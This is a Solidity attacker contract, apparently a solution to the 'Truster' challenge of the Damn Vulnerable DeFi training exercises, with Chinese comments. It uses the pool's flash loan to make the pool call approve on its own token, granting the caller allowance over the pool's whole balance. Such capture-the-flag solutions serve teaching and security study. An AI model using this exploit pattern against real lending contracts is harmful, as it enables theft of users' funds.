// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    TrusterLenderPool public immutable pool;
    IERC20 public immutable damnValuableToken;

    constructor(address poolAddress, address tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack() public {
        uint256 poolBalance = damnValuableToken.balanceOf(address(pool));

        pool.flashLoan(
            0,
            msg.sender,
            address(damnValuableToken), // target 設為 token contract
            abi.encodeWithSignature( // 執行 token.approve(attacker, poolBalance) 允許 attacker 轉走 pool 裡面全部的餘額
                "approve(address,uint256)",
                msg.sender,
                poolBalance
            )
        );
    }
}
